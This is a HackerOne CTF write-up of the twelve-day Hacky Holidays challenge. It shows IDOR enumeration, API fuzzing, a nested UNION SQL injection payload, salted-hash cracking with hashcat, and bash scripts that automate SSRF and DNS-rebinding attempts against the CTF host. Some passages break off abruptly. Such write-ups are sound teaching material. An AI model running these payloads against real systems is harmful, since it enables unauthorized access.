title: Hacky Holidays CTF Writeup

profile.name: h1-ctf
profile.about: todayisnew reached 100K rep. Let's celebrate with a CTF!

vulnerability_information:
Greetings team
Yay! Finally I made it to the end, thank you very much for launching this fantastic event, I had to review topics that I thought I knew, learned a lot and I am sure that I will continue learning with the community :)

{F1130889}

Hacky Holidays!
P.S. I will put my writeup in my next comment.

## Impact

---

activities.message:
# Hacky Holidays CTF Writeup {F1138003} We start with the announcement of the start of the event on [twitter][1], we will have one challenge every day for 12 days in a row and the final goal will be: > **Infiltrate Grinch Networks and take them down!** After reviewing the scope and rules on the official page of the [H1-CTF Program][2], we are left with the scope: > **hackyholidays.h1ctf.com** Having what is necessary at this point, it only remains to wait for the start of the CTF. # Day 1: Grinch Networks {F1138004} Here we begin! checking the main page, it doesn't have many elements, after a quick look at the page source with no results.. ```html $ curl https://hackyholidays.h1ctf.com/ Grinch Networks
``` At this point, before I start fuzzing, I first manually checked [Information disclosure][disclosure] with common files like: - robots.txt - .htaccess - sitemap.xml ```html $ curl https://hackyholidays.h1ctf.com/robots.txt User-agent: * Disallow: /s3cr3t-ar3a Flag: flag{48104912-28b0-494a-9995-a203d1e261e7} ``` Well, it was a simple start, I'm very sure the difficulty will gradually increase. Peeking our secret endpoint `/s3cr3t-ar3a` ```html $ curl https://hackyholidays.h1ctf.com/s3cr3t-ar3a/ Come Back Tomorrow

Come back tomorrow

``` Ok, we have to come back the next day. > flag: **flag{48104912-28b0-494a-9995-a203d1e261e7}** next challenge: /s3cr3t-ar3a # Day 2: Under Construction {F1138005} After inspecting `/s3cr3t-ar3a` page source, we can't find anything that stands out. ```html $ curl https://hackyholidays.h1ctf.com/s3cr3t-ar3a/ Under Construction

Page Moved

I've moved this page to keep people out!

If you're allowed access you'll know where to look for the proper page!

``` Apparently the page has been moved, but how and where? After trying to fuzz files and directories inside `/s3cr3t-ar3a`, no new endpoints were discovered. There wasn't much to hit here, so how about taking a step back.. > View Source and Inspect Element are two browser features that allow developers to look at the HTML for a particular page. Although their outputs can be the same, one should not assume they will be. [source][3] Yeah, after a good few hours wondering what I had missed, I remembered about **Inspect element**, So using DevTools with CTR+SHIFT+I > Elements tab: ```html Under Construction

Page Moved

I've moved this page to keep people out!

If you're allowed access you'll know where to look for the proper page!

``` Flag found!, and we take note of the endpoint for the next challenge. > flag: **flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}** next challenge: **/apps** # Day 3: People Rater {F1138006} Browsing on `/apps`, we will have several challenges launched on this same endpoint apparently, Let's start with the first one, so let's move on `/people-rater`. > People Rater The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong! {F1138007} On `/people-rater` page source we found that it dynamically loads the people records with JavaScript, so we go on to inspect the HTML DOM. ```html Grinch People Rater

Grinch People Rater

Tea Avery
Mihai Matthews
Ruth Ward
Calvin Hogan
Reilly Cervantes
``` We found some base64 encoded values there, went to intercept http traffic with [Burp Suite][burp] and we got: ```html GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1 Host: hackyholidays.h1ctf.com Connection: close Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 X-Requested-With: XMLHttpRequest Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://hackyholidays.h1ctf.com/people-rater Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7 HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Mon, 14 Dec 2020 17:05:45 GMT Content-Type: application/json Connection: close Content-Length: 57 {"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"} ``` We got access to personal data, maybe we have an [IDOR][IDOR] vulnerability?, After base64 decoding `eyJpZCI6Mn0=` we got a value which we can play with: ```bash $ echo eyJpZCI6Mn0=| base64 -d {"id":2} ``` At this point we can create our attack vector with [Burp Suite][burp] and its extension [Hackvector][hackvector] . ```html GET /people-rater/entry?id=<@base64url_0>{"id":2}<@/base64url_0> HTTP/1.1 Host: hackyholidays.h1ctf.com Connection: close Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 X-Requested-With: XMLHttpRequest Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://hackyholidays.h1ctf.com/people-rater Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7 ``` Fuzzing by `id` values, we got as information: ```plain {"id":0} ["Entry not found"] {"id":1} {"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"} {"id":2} {"id":"eyJpZCI6MTd9","name":"Charlton Dillon","rating":"Boring"} {"id":3} -> {"id":17} {"id":18} ["Entry not found"] ``` With `id=1` we have found the Grinch record and our flag. > flag: **flag{b705fb11-fb55-442f-847f-0931be82ed9a}** next challenge: **/apps** # Day 4: Swag Shop New challenge on `/apps`, This time our new endpoint is: `/swag-shop` > Swag Shop Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop. {F1138008} Inspecting `/swag-shop` page source we found calls to an API: ```html $ curl https://hackyholidays.h1ctf.com/swag-shop/ -sk Grinch Swag Shop

Grinch Swag Shop

Login To Your Account

``` We have more elements now, so after browsing and reviewing each one, we have as summary: - `/swag-shop`: home page, only allow to purchase items, it redirects you to login. - `/swag-shop/api`: status code 404. - `/swag-shop/api/login`: POST, valid credentials required. - `/swag-shop/api/purchase`: POST, status code 401, login required. - `/swag-shop/checkout/`: status code 404, requires some valid id. As next step, we did fuzzing on `/swag-shop/api` using [ffuf][ffuf] and [objects.txt][objects.txt] as wordlist. ```bash $ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -t 50 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -X POST -fc 404 -mc all <..> login [Status: 400, Size: 35, Words: 3, Lines: 1] purchase [Status: 401, Size: 33, Words: 5, Lines: 1] :: Progress: [3132/3132] :: Job [1/1] :: 370 req/sec :: Duration: [0:00:07] :: Errors: 0 :: $ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -t 50 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -X GET -fc 404 -mc all <..> sessions [Status: 200, Size: 2194, Words: 1, Lines: 1] user [Status: 400, Size: 35, Words: 3, Lines: 1] :: Progress: [3132/3132] :: Job [1/1] :: 445 req/sec :: Duration: [0:00:07] :: Errors: 0 :: ``` got two new API endpoints: `/swag-shop/api/sessions` and `/swag-shop/api/user`, lets check them ```html GET /swag-shop/api/sessions HTTP/1.1 Host: hackyholidays.h1ctf.com Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Tue, 15 Dec 2020 19:57:59 GMT Content-Type: application/json Connection: Continuing with the endpoint `/swag-shop/api/user/`, We are missing parameters here, after fuzzing manually with values as: `id`, `uuid`, and so on. ```html GET /swag-shop/api/user/?uuid= HTTP/1.1 Host: hackyholidays.h1ctf.com Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close HTTP/1.1 404 Not Found Server: nginx/1.18.0 (Ubuntu) Date: Tue, 15 Dec 2020 20:05:05 GMT Content-Type: application/json Connection: close Content-Length: 40 {"error":"Could not find matching uuid"} ``` Cool!, we have one parameter `uuid` and one likely valid user uuid from our previous step. ```html GET /swag-shop/api/user/?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1 Host: hackyholidays.h1ctf.com Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Tue, 15 Dec 2020 20:03:18 GMT Content-Type: application/json Connection: close Content-Length: 216 {"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"} ``` flag found!, we're done here. > flag: **flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}** next challenge: **/apps** # Day 5: Secure Login New challenge approaches.. , `/apps` gave us again our new challenge: `/secure-login` > Secure Login Try and find a way past the login page to get to the secret area. {F1138009} Challenge home page is just a login form, no changes on its page source or HTML DOM. Lets inspect the http traffic whilst trying to login as `admin:admin` ```html POST /secure-login HTTP/1.1 Host: hackyholidays.h1ctf.com Connection: close Content-Length: 29 Cache-Control: max-age=0 sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 Origin: https://hackyholidays.h1ctf.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://hackyholidays.h1ctf.com/secure-login Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7 username=admin&password=admin HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Wed, 16 Dec 2020 21:34:01 GMT Content-Type: text/html; charset=UTF-8 Connection: close Content-Length: 1724 Secure Login

Inspecting `/forum/login`, we tried: - Login with common credentials as `admin:admin`, It responses with `Username/Password Combination is invalid`, unlikely vulnerable to user enumeration. - Common login bypass by SQLi, without success too. Inspecting `/forum/phpmyadmin`, lead us to the same situation like `/forum/login`. At this point I ran out of ideas, and went to rest. Returning to the challenge, I tried searching for source code on GitHub, GitLab or BitBucket. } $age = intval($_POST["age"]); if (count($errors) === 0) { $cookie = addUser($username, $password, $age, $firstname, $lastname); setcookie('token', $cookie, time() + 3600); header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]); exit(); } } } } include_once($page); ``` Here we analyzed how our entries were recorded on `user.txt` and later retrieved: |variable|length on retrieving|processing on recording |-|-|- |username|15|preg_replace() >> substr(15) |password|32|md5() |cookie|32|md5() |age|3|is_numeric() >> strlen<=3 >> intval() |firstname|15|preg_replace() >> substr(15) |lastname|15|preg_replace() >> substr(15) |admin|1 | Where we have observed that of all the parameters that we can control, the only parameter without explicitly restricted size is `age`. Checking the official PHP documentation again for: [is-numeric()][13], [intval()][14], And debugging possible values with [phpsh][phpsh]: ```bash $ phpsh Starting php type 'h' or 'help' to see instructions & features php> echo is_numeric('9e3') 1 php> echo intval('9e3') 9000 php> echo intval('9e9') 9000000000 ``` Now we can change the last value in our user record by sending an `age` value with 4 digits or more. # Day 11: Grinch Recon {F1138026} We knew our challenge home page from the last challenge already: `/r3c0n_server_4fdk59`, We got the following endpoints after browsing each endpoint available: - `/r3c0n_server_4fdk59`: home page, shows us albums available and how many photos had each one. - `/r3c0n_server_4fdk597/album`: shows all the photos of the selected album according to one GET parameter `hash=`. - `/r3c0n_server_4fdk597/picture`: returns an image file according to one GET parameter `data=`, whose value is protected with a hash and base64 encoded. - `/attack-box`: redirect us to a login form, possibly for the last step. After fuzzing more endpoints on `/r3c0n_server_4fdk59` with [common.txt][common.txt] as wordlist got one new endpoint: `/r3c0n_server_4fdk59/api` ```bash $ ffuf -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -mc all -fc 404 -t 50 -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt api/experiments [Status: 401, Size: 64, Words: 9, Lines: 1] api [Status: 200, Size: 2390, Words: 888, Lines: 54] picture [Status: 200, Size: 21, Words: 3, Lines: 1] uploads [Status: 403, Size: 145, Words: 3, Lines: 7] :: Progress: [4660/4660] :: Job [1/1] :: 131 req/sec :: Duration: [0:00:29] :: Errors: 0 :: ``` Browsing on `/r3c0n_server_4fdk59/api` gave us the API status code descriptions: {F1138024} We have tried to fuzz more content here without success, we moved on to the other endpoints then. We continued to inspect our previous endpoints in detail. **album 'Xmass 2019' request** ```html GET /r3c0n_server_4fdk59/album?hash=59grop HTTP/1.1 Host: hackyholidays.h1ctf.com Connection: close sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7 HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Mon, 28 Dec 2020 15:58:28 GMT Content-Type: text/html; charset=UTF-8 Connection: close Content-Length: 1188 Grinch Recon

Going back to the answer on `/r3c0n_server_4fdk59/album?hash=59grop`, let's inspect our base64 encoded value. ```bash $ echo eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9 | base64 -d {"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"} ``` We knew that we need a valid authorization hash `auth` if we want the server to accept a changed value in `image`. After going out to clear my mind for a while, I remembered a similar challenge in the H101 CTF, a situation where the server did an SQL query with the result of a previous SQL query. Manually trying multiple attack vectors using [Hackvector][hackvector], We got the same image with the following payload: `hash=<@burp_urlencode_0>alfa' union select "0'union select 0,0,<@sql_hex_1>../uploads/32febb19572b12435a6a390c08e8d3da.jpg<@/sql_hex_1>#","bravo","album title"#<@/burp_urlencode_0>` ```html # Xmass 2019 picture GET /r3c0n_server_4fdk59/album?hash=<@burp_urlencode_0>alfa' union select "0'union select 0,0,<@sql_hex_1>../uploads/32febb19572b12435a6a390c08e8d3da.jpg<@/sql_hex_1>#","bravo","album title"#<@/burp_urlencode_0> HTTP/1.1 Host: hackyholidays.h1ctf.com Connection: close sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7 [..] Grinch Recon

In the same way we fuzzed GET parameters using as wordlist [burp-parameter-names.txt][parameters.txt] then. Fuzzing GET parameters: - in `../api/ping` leads to nothing. - in `../api/user` we got: `username` and `password`. I must confess that I was blocked for days in this part, having `username` and `password` as parameters led me to think that it was a badly implemented login, and enumeration of users as if it were a login didn't work. Sharing ideas with other CTF participants, led me to reevaluate that the parameters could also be used to query users either by name or by password. ``` > flag: **flag{07a03135-9778-4dee-a83c-7ec330728e72}** > next challenge: **/attack-box** # Day 12: Attack Console {F1138022} We are in the last challenge now, after browsing all pages which we have access to: - `/attack-box`: main page, allows launching the DDoS attack on Santa's servers. - `/launch?payload=`: allows launching one DDoS attacks on any target: domain/IP, but requires a valid hash for the target. - `/attack-box/launch/`: makes use of `/attack-box/launch/.json` to show an update on the attack status. - `/attack-box/launch/.json` Moving on to analyze the attack on Santa's server: `203.0.113.33` ```html GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1 Host: hackyholidays.h1ctf.com Connection: close sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; At this point, we know valid protection hashes for Santa's servers so I tested: - direct hashing like: MD2, MD4 or MD5. - weak secret with already known plaintext and protection hash: reverse HMAC-MD5. It wasn't until Hackerone released a clue on twitter that I realized I forgot hashing with [salt][salt]. {F1138027} Using [hashcat][hashcat] with [rockyou.txt][rockyou.txt] as wordlist was easy to retrieve the salt value: `mrgrinch463` ```bash $ cat hashes.txt 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 # https://hashcat.net/wiki/doku.php?id=example_hashes # 0 MD5 8743b52063cd84097a65d1633f5c74f5 # 50 HMAC-MD5 (key = $pass) fc741db0a2968c39d9c2a5cc75b05370:1234 # 60 HMAC-MD5 (key = $salt) bfd280436f45fa38eaacac3b00518f29:1234 # 10 md5($pass.$salt) 01dfae6e5d4d90d9892622325959afbe:7050461 # 20 md5($salt.$pass) f0fda58630310a6dd91a7d8f0a4ceda2:4225637426 $ hashcat -a 0 -m 10 hashes.txt /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <..> 5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463 Session..........: hashcat Status...........: Cracked Hash.Name........: md5($pass.$salt) Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 <..> ``` Now we can launch an attack on any domain/IP, trying with `localtest.me` the attack was initially accepted, domain was DNS resolved to `127.0.0.1`, then aborted with message: `Local target detected, aborting attack` ```html GET /attack-box/launch?payload=<@burp_urlencode_1><@base64_0>{"target":"localtest.me","hash":"<@md5_2>mrgrinch463localtest.me<@/md5_2>"}<@/base64_0><@/burp_urlencode_1> HTTP/1.1 Host: hackyholidays.h1ctf.com Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; charset=UTF-8 Connection: close Content-Length: 2930 [...] [...] ``` Since we can only launch one attack every 15 seconds, and then we have to wait a few seconds to see the full attack response, I made a little bash script that will take care of that: **launcher.sh** ```bash #!/bin/bash function pingpong(){ hash=$(echo -n "mrgrinch463${1}"|md5sum|cut -d' ' -f1) payload=$(echo -n """{\"target\":\"$1\",\"hash\":\"${hash}\"}""" | base64) while :; do response=$(curl -ski "https://hackyholidays.h1ctf.com/attack-box/launch" -b "attackbox=d09d508e78f3975e0199a5e91dde9687" -G --data-urlencode "payload=${payload}") target=$(echo -n "${response}"|grep Location | grep -Po "[0-9a-f]{32}") test -n "${target}" && break done echo "target: $1 ,hash: $hash ,log: /launch/$target.json" while :; do sleep 1 response=$(http "https://hackyholidays.h1ctf.com/attack-box/launch/${target}.json" "Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687" -b) goto="" echo "$response" | jq .[].goto | grep -v false && goto="true" && break echo "$response" | grep "maybe try again?" &>/dev/null && break echo "$response" | grep "aborting attack" &>/dev/null && break echo "$response" | grep "Invalid IP or Hostname" &>/dev/null && break done if [[ -z "$goto" ]]; then echo "$response"| jq -r .[-1].content false else echo "$response"| jq . true fi } export -f pingpong parallel -j1 -u --halt now,success=1 pingpong {} ::: $@ ``` We tried variations for `localhost` as the target, without getting favorable results. ```bash $ bash launcher.sh localhost localhost.me 127.0.0.{0..3} target: localhost ,hash: 04ee8ef05337594457b6d58146cfeb2f ,log: /launch/a96b6cdacc3ae2608cae6a01f1c841d1.json Local target detected, aborting attack target: localhost.me ,hash: 384cd92bc9adeaa6d6355075c26f611e ,log: /launch/b67de3e0fd95c60210f1639d042309fd.json Host still up, maybe try again? target: 127.0.0.0 ,hash: 78871ec11f180ae11deb47517aa75367 ,log: /launch/65dc72069a1e62a9ab4dd5b191302db9.json Host still up, maybe try again? target: 127.0.0.1 ,hash: 3e3f8df1658372edf0214e202acb460b ,log: /launch/ee4dd2053c389873a1b6d3f7e4b8c126.json Local target detected, aborting attack target: 127.0.0.2 ,hash: 586ab97d543a78121ccc4d5d3f875d5d ,log: /launch/f299edf655cea098ed43a72a93a3d746.json Host still up, maybe try again? target: 127.0.0.3 ,hash: cf12d242b2729ac324653b31ae4ff8ad ,log: /launch/f5003ceb5a429b8a29b9885bc809e588.json Host still up, maybe try again? ``` After taking a break, and sharing some ideas with other CTF participants led me to review other possible vectors related to [SSRF][ssrf] and DNS like [DNS Pinning][dnspin]. First I modified my script to launch the attack on a domain of my control 20 times: **launcherV2.sh** ```bash #!/bin/bash function pingpong(){ hash=$(echo -n "mrgrinch463${1}"|md5sum|cut -d' ' -f1) payload=$(echo -n """{\"target\":\"$1\",\"hash\":\"${hash}\"}""" | base64) while :; do response=$(curl -ski "https://hackyholidays.h1ctf.com/attack-box/launch" -b "attackbox=d09d508e78f3975e0199a5e91dde9687" -G --data-urlencode "payload=${payload}") target=$(echo -n "${response}"|grep Location | grep -Po "[0-9a-f]{32}") test -n "${target}" && break done echo "target: $1 ,hash: $hash ,log: /launch/$target.json" while :; do sleep 1 response=$(http "https://hackyholidays.h1ctf.com/attack-box/launch/${target}.json" "Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687" -b) goto="" echo "$response" | jq .[].goto | grep -v false && goto="true" && break echo "$response" | grep "maybe try again?" &>/dev/null && break echo "$response" | grep "aborting attack" &>/dev/null && break echo "$response" | grep "Invalid IP or Hostname" &>/dev/null && break done if [[ -z "$goto" ]]; then echo "$response"| jq -r .[-1].content false else echo "$response"| jq . true fi } export -f pingpong parallel -j1 -u --halt now,success=1 $1 ::: {1..20} ``` We noticed that the attack was launched 20 times, but my domain has only received 5 DNS requests. So there is DNS caching involved on the server side. ```bash $ bash launcherV2.sh ping.dns.████████ target: ping.dns.██████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: still up, maybe try again? target: ping.dns.█████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: /launch/3a623deb8d5d1ebf4552fce49384d301.json Host still up, maybe try again? target: ping.dns.██████████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: /launch/d7a6a59a8614094c6cff4bd156990981.json Host still up, maybe try again? target: ping.dns.████████ ,hash: /launch/660524f8f7a4bb2423680db6221d4674.json Host still up, maybe try again? ``` So I set a new DNS record set on my domain with the following response: - DNS name: test.███ - Type: A - Data: -
